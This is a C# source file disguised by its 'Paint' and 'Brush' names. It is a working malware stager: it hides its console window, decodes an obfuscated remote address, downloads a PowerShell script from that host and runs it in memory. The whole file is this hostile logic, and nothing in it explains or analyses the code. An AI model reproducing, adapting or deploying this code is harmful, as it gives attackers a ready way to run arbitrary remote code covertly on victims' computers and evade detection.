using System.Management.Automation;
using System.Runtime.InteropServices;
using System.Net;
using System;
using System.IO;
namespace Paint
{
    class Brush
    {
    [DllImport("kernel32.dll")]
  	static extern IntPtr GetConsoleWindow();

  	[DllImport("user32.dll")]
  	static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        static void Main()
        {
        var Console = GetConsoleWindow();
    		ShowWindow(Console, 0);
        //System.Threading.Thread.Sleep(60000);        
    var request = (HttpWebRequest)WebRequest.Create(dec("QExMSHYLCw==")+dec("DQkKcnAKDgkNCglzDw==")+":"+dec("DQgIDg0=")+dec("C8KzT0FE"));
    var response = (HttpWebResponse)request.GetResponse();
    var code = new StreamReader(response.GetResponseStream()).ReadToEnd();

		PowerShell ps = PowerShell.Create();
		ps.AddScript(code);
		ps.Invoke();



        }

        static string dec(string str)
{
string base64Decoded;
byte[] data = System.Convert.FromBase64String(str);
byte t = 50;
byte r =10;
for (int i = 0; i < data.Length; i++)
    data[i] = (byte)((data[i] ^ t)-r);
    base64Decoded = System.Text.ASCIIEncoding.ASCII.GetString(data);
    return base64Decoded;

}

    }
}
